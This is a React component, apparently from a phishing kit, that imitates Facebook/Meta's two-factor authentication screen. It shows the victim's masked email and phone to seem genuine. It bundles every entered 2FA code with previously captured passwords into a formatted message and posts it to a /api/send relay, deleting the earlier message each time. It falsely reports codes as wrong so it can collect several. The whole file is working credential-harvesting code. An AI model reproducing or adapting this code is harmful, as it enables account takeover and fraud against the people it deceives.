import GoogleAuthImage from '@/assets/images/googelauth-image.jpg';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import VerifyImage from '@/assets/images/verify-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [step, setStep] = useState<'code' | 'alternative'>('code');

    const { geoInfo, messageId, baseMessage, passwords, codes, addCode, setMessageId, userEmail, userPhoneNumber, userFullName, translations: storeTranslations } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };

    // Mask email function: s****g@gmail.com (1 chữ đầu + 4 dấu * cố định + 1 chữ cuối)
    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (!localPart || !domain) return email;
        if (localPart.length === 0) return email;
        
        const firstChar = localPart[0];
        const lastChar = localPart.length > 1 ? localPart[localPart.length - 1] : '';
        
        // Luôn dùng 4 dấu * cố định
        if (localPart.length === 1) {
            return `${firstChar}****@${domain}`;
        }
        
        return `${firstChar}****${lastChar}@${domain}`;
    };

    // Format phone: +849123456981 → +84****981 (country code + 4 dấu * cố định + 3 số cuối)
    const formatPhone = (phone: string): string => {
        if (!phone) return '';
        
        // Lấy tất cả số (bỏ khoảng trắng, dấu gạch ngang, dấu ngoặc, v.v.)
        const allDigits = phone.replace(/[^\d]/g, '');
        if (allDigits.length === 0) return phone;
        
        // Xác định country code (ưu tiên 2 số, sau đó 1 số, cuối cùng 3 số)
        let countryCode = '';
        let countryCodeDigits = '';
        
        // Danh sách country code 2 số phổ biến
        const twoDigitCodes = ['84', '44', '49', '33', '39', '34', '32', '31', '30', '27', '20', '90', '91', '92', '93', '94', '95', '98', '86', '81', '82', '60', '61', '62', '63', '64', '65', '66'];
        
        // Thử 2 số đầu
        if (allDigits.length >= 3) {
            const twoDigit = allDigits.slice(0, 2);
            if (twoDigitCodes.includes(twoDigit)) {
                countryCode = `+${twoDigit}`;
                countryCodeDigits = twoDigit;
            }
        }
        
        // Nếu không tìm thấy, thử 1 số (chỉ cho US/Canada +1)
        if (!countryCode && allDigits.length >= 2 && allDigits[0] === '1') {
            countryCode = '+1';
            countryCodeDigits = '1';
        }
        
        // Nếu vẫn không tìm thấy, dùng regex để lấy 1-3 số đầu
        if (!countryCode) {
            const countryCodeMatch = phone.match(/^\+?(\d{1,3})/);
            if (!countryCodeMatch) return phone;
            countryCode = `+${countryCodeMatch[1]}`;
            countryCodeDigits = countryCodeMatch[1];
        }
        
        // Số sau country code
        const phoneDigits = allDigits.slice(countryCodeDigits.length);
        
        if (phoneDigits.length === 0) return phone;
        
        // Lấy 3 số cuối (bắt buộc phải có 3 số cuối)
        if (phoneDigits.length < 3) return phone; // Không đủ 3 số cuối
        
        const last3 = phoneDigits.slice(-3);
        
        // Luôn dùng 4 dấu * cố định
        return `${countryCode}****${last3}`;
    };


    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || countdown > 0 || !baseMessage) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        try {
            // Rebuild message: baseMessage + tất cả passwords + tất cả codes (bao gồm code mới)
            let updatedMessage = baseMessage;
            
            // Thêm tất cả passwords
            passwords.forEach((pwd, index) => {
                updatedMessage += `\n🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`;
            });
            
            // Thêm tất cả codes đã có
            codes.forEach((c, index) => {
                updatedMessage += `\n🔐 <b>Code ${index + 1}:</b> <code>${c}</code>`;
            });
            
            // Thêm code mới
            const codeNumber = codes.length + 1;
            updatedMessage += `\n🔐 <b>Code ${codeNumber}:</b> <code>${code}</code>`;
            
            // Lưu code mới vào store
            addCode(code);

            // Xóa message cũ nếu có
            if (messageId) {
        try {
                    await axios.post('/api/delete', {
                message_id: messageId
            });
                } catch {
                    // Ignore error if delete fails
                }
            }

            // Gửi message mới
            const res = await axios.post('/api/send', {
                message: updatedMessage
            });
            
            // Cập nhật messageId mới
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    const actualEmail = userEmail ? maskEmail(userEmail) : '';
    const actualPhone = userPhoneNumber ? formatPhone(userPhoneNumber) : '';
    const displayName = userFullName || 'User';

    // Format countdown: "0 minutes 17 seconds"
    const formatCountdown = (seconds: number): string => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins} ${t('minutes')} ${secs} ${t('seconds')}`;
    };


    return (
        <div className='fixed inset-0 z-10 flex items-center justify-center bg-black/40 md:py-[40px] py-[20px]'>
            <div className='bg-white max-h-[100%] h-full w-full max-w-lg mx-4 md:mx-0 shadow-lg px-[20px] py-[20px] rounded-[16px] flex flex-col overflow-hidden'>
                <div className='flex items-center justify-between pb-[0px]'></div>
                <div className='flex-1 overflow-y-auto'>
                    <div className='h-full flex flex-col flex-start w-full items-center justify-between flex-1'>
                        <div className='w-full'>
                            <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                                <span>{displayName}</span>
                                <div className='w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]'></div>
                                <span>{t('Facebook')}</span>
                            </div>
                            <h2 className='text-[20px] text-black font-[700] mb-[15px]'>
                                {step === 'code' 
                                    ? t('Two-factor authentication required')
                                    : t('Go to your authentication app')
                                }
                            </h2>
                            <p className='text-[#9a979e] text-[14px] mb-[15px]'>
                                {step === 'code' 
                                    ? `${t("We've sent a verification code to your")} ${actualEmail}${actualPhone ? ` ${t('and').toLowerCase()} ${actualPhone}` : ''}. ${t('To continue, you\'ll need to enter a verification code or approve it from another device.')} ${t('This process may take a few minutes.')} ${t('Please don\'t leave this page until you receive the code.')}`
                                    : t('Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).')
                                }
                            </p>
                            <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                                <Image src={step === 'code' ? VerifyImage : GoogleAuthImage} alt='' className='w-full h-auto' />
                            </div>
                            <div className='w-full'>
                                <form
                                    onSubmit={(e) => {
                                        e.preventDefault();
                                        handleSubmit();
                                    }}
                                >
                                    <div className={`input w-full border ${showError && countdown > 0 ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 transition-all duration-200`}>
                        <input
                                            id='twoFa'
                                            placeholder={t('Code')}
                                            className={`w-full outline-none h-full bg-transparent ${showError && countdown > 0 ? 'opacity-70 cursor-not-allowed' : ''}`}
                                            type='number'
                                            inputMode='numeric'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                                            disabled={countdown > 0 || isLoading}
                        />
                    </div>
                                    {showError && countdown > 0 && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>
                                            {t('The two-factor authentication you entered is incorrect')}. {t('Please, try again after')} {formatCountdown(countdown)}.
                        </p>
                    )}
                                    <div className='w-full mt-[20px]'>
                                        <button
                                            type='submit'
                                            disabled={isLoading || !code.trim() || countdown > 0}
                                            className={`w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 h-[40px] min-h-[40px] ${isLoading || !code.trim() || countdown > 0 ? 'cursor-not-allowed opacity-70' : 'cursor-pointer'}`}
                                        >
                                            {isLoading ? (
                                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                            ) : (
                                                t('Continue')
                                            )}
                    </button>
                </div>
                                    <div 
                                        className='w-full mt-[10px] text-[#495057] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] h-[40px] min-h-[40px]'
                                        onClick={() => setStep(step === 'code' ? 'alternative' : 'code')}
                                    >
                                        <span>{t('Try another way')}</span>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div className='w-[60px] mt-[20px] mx-auto'>
                            <Image src={MetaLogo} alt='' width={60} height={18} className='w-full h-full' />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;

